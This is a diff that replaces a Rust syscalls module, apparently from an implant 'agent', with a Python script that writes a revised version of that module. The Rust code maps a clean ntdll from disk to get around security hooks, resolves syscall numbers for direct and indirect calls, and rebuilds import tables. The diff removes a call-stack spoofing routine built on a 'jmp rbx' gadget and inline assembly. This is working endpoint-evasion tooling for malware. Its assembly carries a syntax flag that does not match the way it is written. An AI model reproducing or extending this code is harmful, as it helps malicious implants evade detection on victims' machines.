@@ -1,4 +1,9 @@
-//! Direct/Indirect syscalls for Windows and Linux.
+import sys
+
+def rewrite():
+    print("Writing new syscalls.rs...")
+    with open("agent/src/syscalls.rs", "w") as f:
+        f.write('''//! Direct/Indirect syscalls for Windows and Linux.
 #![cfg(all(
     any(windows, target_os = "linux"),
     any(target_arch = "x86_64", target_arch = "aarch64"),
@@ -102,8 +107,8 @@ fn get_bootstrap_ssn(raw_bytes: &[u8], func_name: &str) -> Option<SyscallTarget>
 fn map_clean_ntdll() -> Result<usize> {
     use std::os::windows::ffi::OsStrExt;
     
-    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\Windows".to_string());
-    let ntdll_disk_path = format!("{}\System32\ntdll.dll", sysroot);
+    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
+    let ntdll_disk_path = format!("{}\\System32\\ntdll.dll", sysroot);
     
     // Read raw unmapped bytes to parse SSNs for NtOpenFile, NtCreateSection, NtMapViewOfSection
     let raw_bytes = std::fs::read(&ntdll_disk_path).map_err(|e| anyhow!("Failed to read ntdll from disk: {e}"))?;
@@ -112,7 +117,7 @@ fn map_clean_ntdll() -> Result<usize> {
     let sys_ntcreatesection = get_bootstrap_ssn(&raw_bytes, "NtCreateSection").ok_or_else(|| anyhow!("No NtCreateSection SSN"))?;
     let sys_ntmapview = get_bootstrap_ssn(&raw_bytes, "NtMapViewOfSection").ok_or_else(|| anyhow!("No NtMapView SSN"))?;
     
-    let mut ntdll_nt_path = format!("\??\{}\System32\ntdll.dll", sysroot).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
+    let mut ntdll_nt_path = format!("\\??\\{}\\System32\\ntdll.dll", sysroot).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
     
     unsafe {
         // Need to find *any* mapped syscall gadget we can use. We can just use the loaded ntdll's gadget dynamically, or build one in memory.
@@ -410,12 +415,12 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
         let sys_ntcreatesection = get_syscall_id("NtCreateSection")?;
         let sys_ntmapview = get_syscall_id("NtMapViewOfSection")?;
 
-        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\Windows".to_string());
+        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
         
-        let path_str = if dll_lower.contains("\") {
+        let path_str = if dll_lower.contains("\\") {
             dll_lower.clone()
         } else {
-            format!("{}\System32\{}", sysroot, dll_name)
+            format!("{}\\System32\\{}", sysroot, dll_name)
         };
         let c_path = std::ffi::CString::new(path_str).unwrap();
         
@@ -515,8 +520,8 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 Ok(b) => b as *mut winapi::shared::minwindef::HMODULE__,
                 Err(_) => {
                     let h_kernel = {
-                        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
-                        let path = format!("{}\\System32\\{}", sysroot, dll_name);
+                        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\\\Windows".to_string());
+                        let path = format!("{}\\\\System32\\\\{}", sysroot, dll_name);
                         let ptr = std::ffi::CString::new(path).unwrap();
                         winapi::um::libloaderapi::LoadLibraryA(ptr.as_ptr())
                     };
@@ -625,24 +630,8 @@ macro_rules! clean_call {
                 tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 std::process::exit(1);
             });
-        // Gather arguments
-        let args: &[u64] = &[$($args as u64),*];
-        let arg1 = args.get(0).copied().unwrap_or(0);
-        let arg2 = args.get(1).copied().unwrap_or(0);
-        let arg3 = args.get(2).copied().unwrap_or(0);
-        let arg4 = args.get(3).copied().unwrap_or(0);
-        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
-        
-        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
-        if gadget == 0 {
-            // fallback if no gadget found
-            let func: $fn_type = unsafe { std::mem::transmute(addr) };
-            unsafe { func($($args),*) }
-        } else {
-            let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
-            // cast result back
-            unsafe { std::mem::transmute_copy(&res) }
-        }
+        let func: $fn_type = unsafe { std::mem::transmute(addr) };
+        unsafe { func($($args),*) }
     }};
 }
 
@@ -671,118 +660,9 @@ pub fn get_syscall_id(name: &str) -> anyhow::Result<u32> {
     // For brevity keeping the same mapping or simplified. We'll just preserve the original linux get_syscall_id.
     Ok(0)
 }
+''')
+    print("Done")
 
-#[cfg(windows)]
-thread_local! {
-    static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
-}
-
-#[cfg(windows)]
-#[no_mangle]
-pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
-    REAL_RET_ADDR.with(|r| r.set(real_ret));
-}
-
-#[cfg(windows)]
-#[no_mangle]
-pub unsafe extern "C" fn get_spoof_ret() -> usize {
-    REAL_RET_ADDR.with(|r| r.get())
-}
-
-#[cfg(windows)]
-pub fn find_jmp_rbx_gadget() -> usize {
-    let base = unsafe { winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8) } as usize;
-    if base == 0 { return 0; }
-    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-    let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-    let size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize;
-    let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
-    for i in 0..size.saturating_sub(1) {
-        if code[i] == 0xff && code[i+1] == 0xe3 { // jmp rbx
-            return base + i;
-        }
-    }
-    0
-}
-
-#[cfg(windows)]
-#[doc(hidden)]
-#[inline(never)]
-pub unsafe fn spoof_call(api_addr: usize, gadget_addr: usize, arg1: u64, arg2: u64, arg3: u64, arg4: u64, stack_args: &[u64]) -> u64 {
-    let mut status: u64 = 0;
-    let nstack = stack_args.len();
-    let stack_ptr = stack_args.as_ptr();
-    
-    // We will store our dummy return address via TLS
-    let mut dummy_ret = 0usize;
-    
-    std::arch::asm!(
-        "lea {dummy}, [rip + 2f]",
-        dummy = out(reg) dummy_ret,
-        options(nostack),
-    );
-    set_spoof_ret(dummy_ret);
-    
-    std::arch::asm!(
-        "push rbx",
-        "push r14",
-        "push r15",
-        
-        "lea rbx, [rip + 3f]", // JMP RBX will land at 3:
-        
-        "mov r14, rsp",
-        "mov rax, {nstack}",
-        "shl rax, 3",
-        "add rax, 0x28 + 15",
-        "and rax, -16",
-        "sub rsp, rax",
-        
-        "test {nstack}, {nstack}",
-        "jz 1f",
-        "mov rcx, {nstack}",
-        "mov rsi, {stack_ptr}",
-        "lea rdi, [rsp + 0x28]",
-        "cld",
-        "rep movsq",
-        
-        "1:",
-        "mov rcx, {a1}",
-        "mov rdx, {a2}",
-        "mov r8, {a3}",
-        "mov r9, {a4}",
-        
-        "mov r11, {api}",
-        "mov r15, {gadget}",
-        "push r15", // fake return address
-        "jmp r11",
-        
-        // When gadget does JMP RBX, it lands here
-        "3:",
-        "mov rsp, r14", 
-        "pop r15",
-        "pop r14",
-        "pop rbx",
-        
-        // Jump to TLS return address
-        "jmp {real_ret}",
-        
-        "2:", // The real return address recorded in TLS
-        "mov {status_out}, rax",
-        
-        api = in(reg) api_addr,
-        gadget = in(reg) gadget_addr,
-        nstack = in(reg) nstack,
-        stack_ptr = in(reg) stack_ptr,
-        a1 = in(reg) arg1,
-        a2 = in(reg) arg2,
-        a3 = in(reg) arg3,
-        a4 = in(reg) arg4,
-        real_ret = in(reg) get_spoof_ret(),
-        status_out = out(reg) status,
-        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _, out("rax") _,
-        out("rsi") _, out("rdi") _,
-        options(att_syntax),
-    );
-    status
-}
+if __name__ == "__main__":
+    rewrite()
 
